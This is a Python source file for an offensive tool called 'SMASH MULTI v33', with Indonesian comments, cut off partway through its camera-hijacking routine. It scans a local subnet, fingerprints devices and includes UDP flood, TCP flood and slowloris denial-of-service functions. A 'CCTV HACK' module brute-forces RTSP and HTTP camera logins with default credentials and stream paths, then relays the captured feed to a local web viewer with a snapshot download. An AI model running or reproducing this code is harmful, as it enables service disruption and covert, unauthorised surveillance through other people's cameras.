# language: Python, file: smash_multi_v33.py, target: Termux / Linux / Windows Python 3.8+
# install: pkg install nmap python ffmpeg && pip install scapy
# new: RTSP bruteforce + ffmpeg MJPEG bridge + mediamtx HLS fallback untuk EZVIZ & semua kamera

import socket
import threading
import random
import time
import sys
import os
import signal
import subprocess
import platform
import ctypes
import http.server
import urllib.request
import urllib.error
import base64
import shutil
import tempfile
import zipfile
import re
import json
import html as html_module
from concurrent.futures import ThreadPoolExecutor
import queue as _queue
from urllib.parse import urlparse, urljoin, urldefrag

# ── polyfill os.geteuid untuk Windows ────────────────────────────────────────
if not hasattr(os, "geteuid"):
    def _geteuid():
        try:
            return 0 if ctypes.windll.shell32.IsUserAnAdmin() else 1
        except:
            return 1
    os.geteuid = _geteuid

G="\033[92m"; B="\033[94m"; C="\033[96m"; M="\033[95m"
W="\033[97m"; R="\033[91m"; Y="\033[93m"; N="\033[0m"
BOX_TOP="┌────────────────────────────────────────┐"
BOX_BOT="└────────────────────────────────────────┘"

def box_header(t):
    s=f" {t} "; pl=(40-len(s))//2; pr=40-len(s)-pl
    return f"{G}│{N}{' '*pl}{G}{s}{N}{' '*pr}{G}│{N}"

def clear(): os.system('clear' if os.name=='posix' else 'cls')

# ─── DETEKSI OS DEVICE LOKAL ──────────────────────────────────────────────────

def get_local_device():
    try:
        result = subprocess.run(
            ["getprop", "ro.build.version.release"],
            capture_output=True, text=True, timeout=2
        )
        ver = result.stdout.strip()
        if ver and ver[0].isdigit():
            major = max(1, min(17, int(ver.split(".")[0])))
            return f"Android {major}"
    except: pass

    android_hints = ["/system/build.prop", "/proc/version"]
    for f in android_hints:
        try:
            with open(f, "r") as fp:
                if "android" in fp.read().lower():
                    return "Android"
        except: pass

    sys_platform = platform.system().lower()
    if sys_platform == "windows":
        try:
            ver = platform.version(); parts = ver.split(".")
            major = int(parts[0]); minor = int(parts[1]) if len(parts)>1 else 0
            build = int(parts[2]) if len(parts)>2 else 0
            if major==10 and build>=22000: return "Windows 11"
            if major==10: return "Windows 10"
            if major==6 and minor==3: return "Windows 8.1"
            if major==6 and minor==2: return "Windows 8"
            if major==6 and minor==1: return "Windows 7"
            return f"Windows {major}"
        except: return "Windows"
    elif sys_platform == "darwin":
        try: return f"macOS {platform.mac_ver()[0]}"
        except: return "macOS"
    elif sys_platform == "linux": return "Linux"
    return "Unknown"

def get_realtime_clock(): return time.strftime("%H:%M")

def print_banner():
    jam = get_realtime_clock(); device = get_local_device()
    print(f"""{G}
   ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗
   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║
   ███████║██╔████╔██║███████║███████║███████║
   ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║
   ███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║
   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{R}         SMASH MULTI v33{N}
{G}┌────────────────────────────────────────┐{N}
{G}│{N}  Jam    : {Y}{jam}                        {N}{G}│{N}
{G}│{N}  Device : {C}{device}                   {N}{G}│{N}
{G}└────────────────────────────────────────┘{N}
""")

# ─── PORT LIST ────────────────────────────────────────────────────────────────

MOBILE_TARGET_PORTS = [
    21, 22, 23, 80, 135, 139, 443, 445, 548, 631, 808, 902, 1080,
    3306, 3389, 5000, 5001, 5353, 5555, 5556, 5557, 5558, 5559, 5560,
    5800, 5900, 62078, 7000, 7100, 8008, 8009, 8080, 8443, 9100,
    49152, 49153, 49154, 50000, 50001, 55000
]

# ─── TTL GRAB ─────────────────────────────────────────────────────────────────

def get_ttl(ip):
    try:
        result = subprocess.run(["ping","-c","1","-W","1",ip],
                                capture_output=True,text=True,timeout=3)
        for line in result.stdout.splitlines():
            if "ttl=" in line.lower():
                for part in line.split():
                    if part.lower().startswith("ttl="):
                        return int(part.split("=")[1])
    except: pass
    return None

def detect_os(ip, gateway=None):
    if gateway and ip==gateway: return "Gateway/Router"
    if ip.endswith(".1"): return "Gateway/Router"
    ttl = get_ttl(ip)
    ttl_guess = None
    if ttl:
        if 60<=ttl<=70: ttl_guess="Android/Linux/iOS"
        elif 120<=ttl<=130: ttl_guess="Windows"
    open_ports=[]
    for port in [22,23,80,135,139,443,445,5555,5556,5557,5558,5559,5560,7000,8080,8443,62078]:
        try:
            s=socket.socket(); s.settimeout(0.4)
            if s.connect_ex((ip,port))==0: open_ports.append(port)
            s.close()
        except: pass
    if any(p in open_ports for p in range(5555,5561)): return "Android (ADB)"
    if 62078 in open_ports or 7000 in open_ports: return "iOS / Apple"
    if 135 in open_ports or 139 in open_ports or 445 in open_ports: return "Windows"
    if 22 in open_ports or 23 in open_ports: return "Linux/Router"
    if 80 in open_ports or 443 in open_ports or 8080 in open_ports: return "Web Server"
    if ttl_guess: return f"~{ttl_guess} (TTL={ttl})"
    return "Unknown"

# ─── SCAN: NMAP ───────────────────────────────────────────────────────────────

def scan_jaringan(gateway):
    prefix = ".".join(gateway.split(".")[:3]) + ".0/24"
    print(f"\n{C}[*] Scan {prefix} via nmap...{N}")
    try:
        result = subprocess.run(["nmap","-sn","-T4",prefix],
                                capture_output=True,text=True,timeout=90)
        lines = result.stdout.splitlines()
    except FileNotFoundError:
        print(f"{R}[!] nmap tidak ada. Install: pkg install nmap{N}"); return []
    except Exception as e:
        print(f"{R}[!] scan gagal: {e}{N}"); return []
    hosts=[]; current_ip=None
    for line in lines:
        if "Nmap scan report for" in line:
            current_ip = line.split()[-1].strip("()")
        elif "Host is up" in line and current_ip:
            if current_ip != gateway: hosts.append({"ip":current_ip})
            current_ip = None
    hosts.sort(key=lambda x: int(x["ip"].split(".")[-1]))
    return hosts

def tampilkan_hosts(hosts):
    print(f"\n{G}{BOX_TOP}{N}"); print(box_header(f'DITEMUKAN {len(hosts)} DEVICE')); print(f"{G}{BOX_BOT}{N}\n")
    for i,h in enumerate(hosts,1):
        print(f"{C}  [{i}]{N} {h['ip']}")

# ─── ATTACKS ──────────────────────────────────────────────────────────────────

def udp_multiport(target_ip, stop_event):
    ports=[53,67,68,123,137,138,161,500,1900,4500,5353]
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    payload=os.urandom(1400)
    while not stop_event.is_set():
        try: s.sendto(payload,(target_ip,random.choice(ports)))
        except: pass

def tcp_flood(target_ip, stop_event):
    ports=[80,443,8080,8443,22,23,21,554,7070]
    while not stop_event.is_set():
        try:
            s=socket.socket(); s.settimeout(1)
            s.connect((target_ip,random.choice(ports)))
            time.sleep(0.05); s.close()
        except: pass

def slowloris(target_ip, port=80, stop_event=None):
    ua_list=["Mozilla/5.0 (Linux; Android 13)","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
    socks=[]
    for _ in range(150):
        if stop_event and stop_event.is_set(): break
        try:
            s=socket.socket(); s.settimeout(4); s.connect((target_ip,port))
            s.send((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target_ip}\r\n"
                    f"User-Agent: {random.choice(ua_list)}\r\n").encode())
            socks.append(s)
        except: pass
    while not (stop_event and stop_event.is_set()):
        dead=[]
        for s in socks:
            try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except: dead.append(s)
        for s in dead:
            socks.remove(s)
            try:
                ns=socket.socket(); ns.settimeout(4); ns.connect((target_ip,port))
                ns.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                socks.append(ns)
            except: pass
        time.sleep(10)

# ─── CCTV HACK ────────────────────────────────────────────────────────────────

# Credentials default yang paling umum — EZVIZ default: admin + no password atau admin:admin
CCTV_CREDS = [
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "888888"),   # EZVIZ/Hikvision common
    ("admin", "666666"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "111111"),
    ("admin", "000000"),
    ("", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("root", ""),
    ("root", "root"),
    ("root", "admin"),
]

# RTSP path yang dicoba — EZVIZ pakai path Hikvision karena OEM Hikvision
RTSP_PATHS = [
    # EZVIZ / Hikvision
    "/h264/ch1/main/av_stream",
    "/h264/ch1/sub/av_stream",
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/Streaming/Channels/102",
    "/ISAPI/Streaming/channels/101",
    "/cam/realmonitor?channel=1&subtype=0",   # Dahua
    "/cam/realmonitor?channel=1&subtype=1",
    "/live/ch00_0",
    "/live/ch00_1",
    "/live0.264",
    "/live1.264",
    "/video1",
    "/video2",
    "/videoMain",
    "/videoSub",
    "/stream1",
    "/stream2",
    "/av0_0",
    "/av0_1",
    "/channel1",
    "/0",
    "/1",
    "/media/video1",
    "/mpeg4/media.amp",
    "/axis-media/media.amp",         # Axis
    "/mpeg4/1/media.amp",
    "/onvif/profile0/media.smp",     # ONVIF
    "/onvif/profile1/media.smp",
    "/MediaInput/h264/stream_1",
    "/",
]

# HTTP stream path fallback (kalau RTSP tidak work)
HTTP_STREAM_PATHS = [
    "/ISAPI/Streaming/channels/101/httpPreview",
    "/ISAPI/Streaming/channels/1/httpPreview",
    "/cgi-bin/mjpg/video.cgi?channel=0&subtype=1",
    "/cgi-bin/mjpg/video.cgi",
    "/cgi-bin/snapshot.cgi",
    "/video.mjpg",
    "/mjpg/video.mjpg",
    "/videostream.cgi",
    "/video",
    "/snapshot.jpg",
    "/snap.jpg",
    "/image.jpg",
    "/cgi-bin/video.cgi",
    "/axis-cgi/mjpg/video.cgi",
    "/cgi-bin/viewer/video.jpg",
    "/live/ch00_0",
    "/img/video.mjpeg",
    "/now.jpg",
    "/jpg/image.jpg",
    "/tmpfs/auto.jpg",
    "/oneshotimage.jpg",
    "/GetData.cgi",
    "/",
]

CCTV_PORTS  = [80, 554, 8000, 8080, 8554, 8888, 37777]

def port_open(ip, port, timeout=0.8):
    try:
        s=socket.socket(); s.settimeout(timeout)
        r=s.connect_ex((ip,port)); s.close()
        return r==0
    except: return False

def grab_http_banner(ip, port, timeout=1.5):
    try:
        s=socket.socket(); s.settimeout(timeout); s.connect((ip,port))
        s.sendall(f"GET / HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
        banner=b""
        while True:
            chunk=s.recv(1024)
            if not chunk: break
            banner+=chunk
            if len(banner)>4096: break
        s.close()
        return banner.decode(errors="ignore").lower()
    except: return ""

def fingerprint_cctv(ip):
    open_ports=[]
    for p in CCTV_PORTS:
        if port_open(ip,p): open_ports.append(p)
    if not open_ports: return None

    best_port = open_ports[0]
    banner=""
    for p in [80,8080,8888]:
        if p in open_ports:
            banner=grab_http_banner(ip,p); best_port=p; break

    # Kalau cuma SDK port, cari port HTTP
    http_ports=[p for p in open_ports if p not in [8000,37777,554,8554]]
    if not http_ports:
        for fp in [80,8080,8888]:
            if port_open(ip,fp,timeout=1.2):
                open_ports.append(fp); best_port=fp; break
        else:
            best_port=554 if 554 in open_ports else open_ports[0]

    return {
        "ip":         ip,
        "port":       best_port,
        "open_ports": open_ports,
        "has_rtsp":   554 in open_ports or 8554 in open_ports,
        "rtsp_port":  554 if 554 in open_ports else (8554 if 8554 in open_ports else 554),
        "banner":     banner[:200],
    }

def scan_cctv_jaringan(gateway):
    prefix=".".join(gateway.split(".")[:3])
    print(f"\n{C}[*] Scan subnet {prefix}.0/24 untuk CCTV...{N}")
    prefix_cidr=prefix+".0/24"
    live_hosts=[]
    try:
        result=subprocess.run(["nmap","-sn","-T4",prefix_cidr],
                              capture_output=True,text=True,timeout=90)
        current_ip=None
        for line in result.stdout.splitlines():
            if "Nmap scan report for" in line:
                current_ip=line.split()[-1].strip("()")
            elif "Host is up" in line and current_ip:
                if current_ip!=gateway: live_hosts.append(current_ip)
                current_ip=None
    except FileNotFoundError:
        print(f"{R}[!] nmap tidak ada. Install: pkg install nmap{N}")

    if not live_hosts:
        print(f"{Y}[*] Fallback: ping sweep manual...{N}")
        lock2=threading.Lock()
        def ping_check(ip):
            try:
                r=subprocess.run(["ping","-c","1","-W","1",ip],capture_output=True,timeout=2)
                if r.returncode==0:
                    with lock2: live_hosts.append(ip)
            except: pass
        ts=[threading.Thread(target=ping_check,args=(f"{prefix}.{i}",),daemon=True) for i in range(1,255)]
        for t in ts: t.start()
        for t in ts: t.join(timeout=3)

    if not live_hosts: return []
    print(f"{G}[+] {len(live_hosts)} host aktif. Fingerprint CCTV...{N}\n")

    found=[]; lock=threading.Lock(); counter=[0]
    def check(ip):
        r=fingerprint_cctv(ip)
        with lock:
            counter[0]+=1
            print(f"\r{C}[*] {counter[0]}/{len(live_hosts)}: {ip:<16}{N}",end="",flush=True)
            if r: found.append(r)
    ts=[threading.Thread(target=check,args=(ip,),daemon=True) for ip in live_hosts]
    for t in ts: t.start()
    for t in ts: t.join(timeout=12)
    print()
    return found

def tampilkan_cctv(cameras):
    print(f"\n{G}{BOX_TOP}{N}"); print(box_header(f'DITEMUKAN {len(cameras)} CCTV')); print(f"{G}{BOX_BOT}{N}\n")
    for i,cam in enumerate(cameras,1):
        ports_str=", ".join(str(p) for p in cam["open_ports"])
        rtsp_tag=f" {G}[RTSP]{N}" if cam["has_rtsp"] else ""
        print(f"{C}  [{i}]{N} {cam['ip']:<16} ports: {Y}{ports_str}{N}{rtsp_tag}")

# ─── FFMPEG CHECK ─────────────────────────────────────────────────────────────

def ffmpeg_available():
    return shutil.which("ffmpeg") is not None

def mediamtx_available():
    return shutil.which("mediamtx") is not None or shutil.which("rtsp-simple-server") is not None

# ─── RTSP BRUTEFORCE ──────────────────────────────────────────────────────────

def try_rtsp_url(rtsp_url, timeout=4):
    """
    Cek apakah RTSP URL bisa diakses dengan ffprobe.
    Return True kalau berhasil.
    """
    if not shutil.which("ffprobe") and not shutil.which("ffmpeg"):
        return False
    tool = shutil.which("ffprobe") or shutil.which("ffmpeg")
    try:
        args = [
            tool, "-v", "quiet",
            "-rtsp_transport", "tcp",
            "-i", rtsp_url,
            "-t", "2",
            "-f", "null", "-"
        ] if "ffprobe" not in tool else [
            tool, "-v", "quiet",
            "-rtsp_transport", "tcp",
            "-i", rtsp_url,
        ]
        r = subprocess.run(args, capture_output=True, timeout=timeout)
        # ffprobe: returncode 0 = stream valid
        # ffmpeg -f null: juga 0 kalau stream ok
        return r.returncode == 0
    except: return False

def bruteforce_rtsp(ip, rtsp_port=554):
    """
    Bruteforce RTSP credentials + path.
    Return rtsp_url yang work, atau None.
    """
    print(f"\n{C}[*] Bruteforce RTSP {ip}:{rtsp_port}...{N}")
    total = len(CCTV_CREDS) * len(RTSP_PATHS)
    count = [0]
    found_url = [None]
    stop_flag = [False]

    def test(user, passwd, path):
        if stop_flag[0]: return
        if passwd:
            url = f"rtsp://{user}:{passwd}@{ip}:{rtsp_port}{path}"
        else:
            url = f"rtsp://{user}@{ip}:{rtsp_port}{path}"
        count[0] += 1
        print(f"\r{C}[*] {count[0]}/{total} — {user}:{passwd}{path[:30]:<35}{N}", end="", flush=True)
        if try_rtsp_url(url, timeout=3):
            found_url[0] = url
            stop_flag[0] = True

    # Test pakai socket dulu — kalau port 554 closed, skip ffmpeg
    if not port_open(ip, rtsp_port, timeout=1):
        print(f"{R}[!] Port {rtsp_port} tertutup.{N}")
        return None

    for user, passwd in CCTV_CREDS:
        if stop_flag[0]: break
        for path in RTSP_PATHS:
            if stop_flag[0]: break
            test(user, passwd, path)

    print()
    return found_url[0]

# ─── FFMPEG MJPEG BRIDGE ──────────────────────────────────────────────────────

_FFMPEG_PROC   = None
_MJPEG_PIPE    = None
_MJPEG_LOCK    = threading.Lock()
_MJPEG_FRAME   = b""
_FFMPEG_RUNNING = False

def start_ffmpeg_bridge(rtsp_url):
    """
    Jalankan ffmpeg yang convert RTSP → raw MJPEG ke stdout.
    Frame dibaca thread background, disimpan di _MJPEG_FRAME.
    """
    global _FFMPEG_PROC, _FFMPEG_RUNNING, _MJPEG_FRAME

    cmd = [
        "ffmpeg",
        "-loglevel",   "quiet",
        "-rtsp_transport", "tcp",
        "-i",          rtsp_url,
        "-f",          "mjpeg",
        "-q:v",        "5",
        "-r",          "10",          # 10 fps — cukup untuk viewer
        "-vf",         "scale=1280:-1",  # max width 1280
        "pipe:1"
    ]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                bufsize=0)
        _FFMPEG_PROC    = proc
        _FFMPEG_RUNNING = True

        def reader():
            global _MJPEG_FRAME, _FFMPEG_RUNNING
            buf = b""
            while _FFMPEG_RUNNING:
                try:
                    chunk = proc.stdout.read(4096)
                    if not chunk:
                        break
                    buf += chunk
                    # Cari JPEG boundary: FF D8 ... FF D9
                    while True:
                        start = buf.find(b"\xff\xd8")
                        if start == -1: buf = b""; break
                        end = buf.find(b"\xff\xd9", start+2)
                        if end == -1: buf = buf[start:]; break
                        frame = buf[start:end+2]
                        with _MJPEG_LOCK:
                            _MJPEG_FRAME = frame
                        buf = buf[end+2:]
                except: break
            _FFMPEG_RUNNING = False

        threading.Thread(target=reader, daemon=True).start()
        return proc
    except Exception as e:
        print(f"{R}[!] ffmpeg gagal: {e}{N}")
        return None

def stop_ffmpeg_bridge():
    global _FFMPEG_PROC, _FFMPEG_RUNNING
    _FFMPEG_RUNNING = False
    if _FFMPEG_PROC:
        try: _FFMPEG_PROC.terminate()
        except: pass
        _FFMPEG_PROC = None

# ─── HLS via MEDIAMTX FALLBACK ────────────────────────────────────────────────

_MEDIAMTX_PROC = None

def start_mediamtx(rtsp_url, hls_port=8888):
    """
    Jalankan mediamtx (atau rtsp-simple-server) sebagai relay:
    RTSP input → HLS output di localhost:8888/stream/
    Return True kalau berhasil start.
    """
    global _MEDIAMTX_PROC
    bin_name = shutil.which("mediamtx") or shutil.which("rtsp-simple-server")
    if not bin_name: return False

    # Buat config minimal di tempfile
    cfg = f"""
logLevel: error
paths:
  stream:
    source: {rtsp_url}
    sourceProtocol: tcp
hlsAddress: :{hls_port}
hlsEnabled: yes
rtspAddress: :8554
rtmpEnabled: no
webrtcEnabled: no
"""
    cfg_file = tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False)
    cfg_file.write(cfg); cfg_file.close()

    try:
        proc = subprocess.Popen([bin_name, cfg_file.name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _MEDIAMTX_PROC = proc
        time.sleep(2)  # tunggu server up
        return proc.poll() is None  # masih running
    except: return False

def stop_mediamtx():
    global _MEDIAMTX_PROC
    if _MEDIAMTX_PROC:
        try: _MEDIAMTX_PROC.terminate()
        except: pass
        _MEDIAMTX_PROC = None

# ─── WEB SERVER PROXY CCTV ────────────────────────────────────────────────────

_PROXY_TARGET = {
    "ip": "", "port": 80, "path": "AUTO",
    "rtsp_url": None, "mode": "http",   # mode: http | ffmpeg | hls
    "hls_port": 8888,
}

class CCTVProxyHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args): pass

    def do_GET(self):
        cam = _PROXY_TARGET
        p   = self.path.split("?")[0]
        if p in ("/", "/index.html"):   self._serve_viewer(cam)
        elif p == "/stream":            self._serve_stream(cam)
        elif p == "/snapshot":          self._serve_snapshot(cam)
        elif p == "/hls_redirect":      self._serve_hls_redirect(cam)
        else:
            self.send_response(404); self.end_headers()

    # ── viewer HTML ──────────────────────────────────────────────────────────

    def _serve_viewer(self, cam):
        mode = cam["mode"]
        ip   = cam["ip"]

        if mode == "hls":
            hls_port = cam["hls_port"]
            video_block = f"""
  <video id="feed" controls autoplay muted playsinline style="width:100%;min-height:360px;background:#000">
    <source src="http://127.0.0.1:{hls_port}/stream/index.m3u8" type="application/vnd.apple.mpegurl">
  </video>
  <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
  <script>
    const video = document.getElementById('feed');
    const src   = 'http://127.0.0.1:{hls_port}/stream/index.m3u8';
    if (Hls.isSupported()) {{
      const hls = new Hls();
      hls.loadSource(src);
      hls.attachMedia(video);
      hls.on(Hls.Events.MANIFEST_PARSED, () => video.play());
    }} else if (video.canPlayType('application/vnd.apple.mpegurl')) {{
      video.src = src; video.play();
    }}
  </script>"""
            status_init = f"HLS stream dari {ip} via mediamtx"
        else:
            # ffmpeg MJPEG atau HTTP fallback — keduanya endpoint /stream
            video_block = f"""
  <img id="feed" src="/stream" alt="Loading..."
       style="width:100%;min-height:360px;object-fit:cover;background:#000"
       onerror="setTimeout(()=>this.src='/stream?t='+Date.now(),3000)">
  <script>
    const feed = document.getElementById('feed');
    feed.onload = () => document.getElementById('statusLine').textContent =
      'Stream aktif — ' + new Date().toLocaleTimeString();
    feed.onerror = () => {{
      document.getElementById('statusLine').textContent = 'Reconnecting...';
      setTimeout(()=>feed.src='/stream?t='+Date.now(), 3000);
    }};
    setInterval(()=>{{ if(feed.naturalWidth===0) feed.src='/stream?t='+Date.now(); }}, 20000);
  </script>"""
            status_init = f"Menghubungkan ke {ip}..."

        html = f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CCTV Viewer — {ip}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;min-height:100vh}}
header{{background:#111;border-bottom:2px solid #00ff41;padding:12px 20px;display:flex;align-items:center;gap:14px}}
.dot{{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:blink 1s infinite}}
@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:.2}}}}
h1{{font-size:.95rem;color:#00ff41;letter-spacing:2px;text-transform:uppercase}}
.meta{{font-size:.72rem;color:#666;margin-left:auto}}
.container{{padding:16px;display:flex;flex-direction:column;align-items:center;gap:14px}}
.cam-box{{position:relative;width:100%;max-width:900px;background:#000;border:2px solid #1a1a1a;border-radius:6px;overflow:hidden}}
.overlay{{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.65);color:#00ff41;font-size:.7rem;padding:3px 9px;border-radius:3px;letter-spacing:1px}}
.controls{{display:flex;gap:10px;flex-wrap:wrap;justify-content:center}}
button{{background:#111;color:#00ff41;border:1px solid #00ff41;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:.8rem;letter-spacing:1px;transition:background .15s}}
button:hover{{background:#00ff41;color:#000}}
#snapBtn{{border-color:#fa0;color:#fa0}}
#snapBtn:hover{{background:#fa0;color:#000}}
.info-box{{width:100%;max-width:900px;background:#111;border:1px solid #1e1e1e;border-radius:6px;padding:12px 16px;font-size:.78rem;line-height:1.85;color:#999}}
.info-box span{{color:#00ff41}}
.status{{color:#00ff41;font-size:.76rem;text-align:center}}
</style>
</head>
<body>
<header>
  <div class="dot"></div>
  <h1>&#9673; CCTV Live Viewer</h1>
  <div class="meta">SMASH MULTI v33 &nbsp;|&nbsp; LOCAL PROXY</div>
</header>
<div class="container">
  <div class="cam-box">
    <div class="overlay">&#9679; LIVE &nbsp; {ip}:{cam['port']}</div>
    {video_block}
  </div>
  <div class="controls">
    <button onclick="location.reload()">&#8635; Refresh</button>
    <button id="snapBtn" onclick="window.open('/snapshot','_blank')">&#128247; Snapshot</button>
    <button onclick="document.querySelector('.cam-box').requestFullscreen?.()">&#9974; Fullscreen</button>
  </div>
  <p class="status" id="statusLine">{status_init}</p>
  <div class="info-box">
    <span>IP</span>      &nbsp;:&nbsp; {ip}<br>
    <span>Port</span>    &nbsp;:&nbsp; {cam['port']}<br>
    <span>Mode</span>    &nbsp;:&nbsp; {mode.upper()}<br>
    <span>RTSP</span>    &nbsp;:&nbsp; {cam['rtsp_url'] or 'N/A'}<br>
    <span>Stream</span>  &nbsp;:&nbsp; http://127.0.0.1:8765/stream<br>
    <span>Snap</span>    &nbsp;:&nbsp; http://127.0.0.1:8765/snapshot
  </div>
</div>
</body>
</html>"""
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # ── stream ───────────────────────────────────────────────────────────────

    def _serve_stream(self, cam):
        mode = cam["mode"]
        if mode == "ffmpeg":
            self._stream_ffmpeg()
        elif mode == "hls":
            # Redirect ke HLS player di viewer
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
        else:
            self._stream_http(cam)

    def _stream_ffmpeg(self):
        """Kirim MJPEG multipart dari frame buffer ffmpeg."""
        boundary = b"--mjpegframe"
        try:
            self.send_response(200)
            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=mjpegframe")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            last_frame = b""
            while _FFMPEG_RUNNING or _MJPEG_FRAME:
                with _MJPEG_LOCK:
                    frame = _MJPEG_FRAME
                if frame and frame != last_frame:
                    last_frame = frame
                    try:
                        header = (f"\r\n{boundary.decode()}\r\n"
                                  f"Content-Type: image/jpeg\r\n"
                                  f"Content-Length: {len(frame)}\r\n\r\n").encode()
                        self.wfile.write(header + frame)
                        self.wfile.flush()
                    except (BrokenPipeError, ConnectionResetError):
                        return
                else:
                    time.sleep(0.05)
                if not _FFMPEG_RUNNING and not frame:
                    break
        except (BrokenPipeError, ConnectionResetError):
            pass
        except Exception as e:
            try: self._serve_error_img(str(e))
            except: pass

    def _stream_http(self, cam):
        """HTTP MJPEG direct proxy dengan path bruteforce."""
        ip = cam["ip"]; port = cam["port"]
        resp = None
        for path in HTTP_STREAM_PATHS:
            resp = self._try_http(ip, port, path)
            if resp: break
        if not resp:
            self._serve_error_img("Semua method gagal. Pastikan ffmpeg terinstall: pkg install ffmpeg")
            return
        try:
            ctype = resp.headers.get("Content-Type","image/jpeg")
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Cache-Control","no-cache,no-store")
            self.end_headers()
            while True:
                try:
                    chunk = resp.read(8192)
                    if not chunk: break
                    self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError): break
                except: break
        except (BrokenPipeError, ConnectionResetError): pass
        except Exception as e:
            try: self._serve_error_img(str(e))
            except: pass
        finally:
            try: resp.close()
            except: pass

    def _serve_snapshot(self, cam):
        """Grab satu frame JPEG."""
        if cam["mode"] == "ffmpeg":
            with _MJPEG_LOCK:
                frame = _MJPEG_FRAME
            if frame:
                try:
                    self.send_response(200)
                    self.send_header("Content-Type","image/jpeg")
                    self.send_header("Content-Length",str(len(frame)))
                    self.send_header("Content-Disposition","attachment; filename=snap.jpg")
                    self.end_headers()
                    self.wfile.write(frame)
                    return
                except (BrokenPipeError, ConnectionResetError): return

        # Fallback HTTP snapshot
        ip=cam["ip"]; port=cam["port"]
        snap_paths=[
            "/ISAPI/Streaming/channels/101/picture",
            "/cgi-bin/snapshot.cgi","/snapshot.jpg","/snap.jpg","/image.jpg",
            "/cgi-bin/mjpg/video.cgi?channel=0&subtype=1",
            "/axis-cgi/jpg/image.cgi","/jpg/image.jpg","/now.jpg",
            "/tmpfs/auto.jpg","/oneshotimage.jpg",
        ]
        resp=None
        for path in snap_paths:
            resp=self._try_http(ip,port,path)
            if resp: break
        if not resp:
            self._serve_error_img("Snapshot tidak tersedia"); return
        try:
            data=resp.read(5*1024*1024)
            ctype=resp.headers.get("Content-Type","image/jpeg")
            self.send_response(200)
            self.send_header("Content-Type",ctype)
            self.send_header("Content-Length",str(len(data)))
            self.send_header("Content-Disposition","attachment; filename=snap.jpg")
            self.end_headers()
            self.wfile.write(data)
        except (BrokenPipeError,ConnectionResetError): pass
        except Exception as e:
            try: self._serve_error_img(str(e))
            except: pass
        finally:
            try: resp.close()
            except: pass

    def _serve_hls_redirect(self, cam):
        self.send_response(302)
        self.send_header("Location", "/")
        self.end_headers()

    def _try_http(self, ip, port, path, timeout=4):
        url = f"http://{ip}:{port}{path}"
        for user, passwd in CCTV_CREDS[:8]:  # top 8 creds saja untuk HTTP
            try:
                cred = f"{user}:{passwd}".encode()
                req  = urllib.request.Request(
                    url,
                    headers={
                        "User-Agent":    "Mozilla/5.0",
                        "Authorization": "Basic " + base64.b64encode(cred).decode(),
                        "Connection":    "keep-alive",
                    }
                )
                resp = urllib.request.urlopen(req, timeout=timeout)
                if resp.status == 200: return resp
                resp.close()
            except urllib.error.HTTPError as e:
                if e.code == 401: continue
            except: pass
        return None

    def _serve_error_img(self, msg):
        svg = f"""<svg xmlns='http://www.w3.org/2000/svg' width='640' height='480'>
<rect width='640' height='480' fill='#0a0a0a'/>
<text x='320' y='210' fill='#222' font-size='52' text-anchor='middle'>&#9673;</text>
<text x='320' y='268' fill='#444' font-size='14' text-anchor='middle' font-family='monospace'>STREAM TIDAK TERSEDIA</text>
<text x='320' y='294' fill='#2a2a2a' font-size='11' text-anchor='middle' font-family='monospace'>{msg[:70]}</text>
<text x='320' y='316' fill='#1e3a1e' font-size='10' text-anchor='middle' font-family='monospace'>Install ffmpeg: pkg install ffmpeg</text>
</svg>""".encode()
        try:
            self.send_response(503)
            self.send_header("Content-Type","image/svg+xml")
            self.send_header("Content-Length",str(len(svg)))
            self.end_headers()
            self.wfile.write(svg)
        except: pass


def start_proxy_server(cam_cfg, srv_port=8765):
    global _PROXY_TARGET
    _PROXY_TARGET = cam_cfg
    server = http.server.HTTPServer(("127.0.0.1", srv_port), CCTVProxyHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

# ─── CCTV HACK MAIN ───────────────────────────────────────────────────────────

def cctv_hack():
    global _FFMPEG_RUNNING
    clear(); print_banner()
    print(f"{G}{BOX_TOP}{N}"); print(box_header('CCTV HACK')); print(f"{G}{BOX_BOT}{N}\n")

    # Cek ffmpeg
    has_ffmpeg = ffmpeg_available()
